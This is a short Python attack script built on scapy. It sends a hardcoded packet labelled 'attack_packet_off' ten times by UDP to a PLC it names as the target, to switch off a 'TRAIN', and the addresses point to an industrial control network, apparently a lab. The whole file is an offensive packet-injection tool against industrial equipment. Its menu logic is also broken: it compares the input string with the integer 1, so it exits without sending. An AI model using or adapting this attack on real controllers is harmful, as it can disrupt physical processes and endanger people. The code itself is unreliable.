# -*- coding: utf-8 -*-
import scapy.all as scapy
from random import randint
import threading, os, sys, optparse
import atexit
import time
from construct import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.layers.inet import UDP, IP

# ---------------------------------------
Local_IP = "192.168.5.103"
Local_MAC  = "00:e0:4c:68:f9:4b"

HMI_IP = "192.168.3.18"
HMI_MAC = "28:e9:8e:24:bb:e0"

PLC_IP = "192.168.3.39"  # This is the target ip
PLC_MAC = "30:be:3b:8a:1a:f9"
# ---------------------------------------

attack_packet_off = "57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a0000000000000001000000000000000000"


def Send_TRAIN_OFF():
    data_off = bytes.fromhex(attack_packet_off)
    udpf = Ether(src = Local_MAC) / IP(src=Local_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    for _ in range(10):
        sendp(udpf)
    print("TRAIN OFF \n")

def main():
    while True:
        user_input = input("Enter a number (1:TRAIN OFF (10 packets); Others: Exit):")
        if user_input != 1:
            print("Bye")
            exit(0)
        if user_input == '1':
            Send_TRAIN_OFF()


if __name__ == '__main__':
    main()
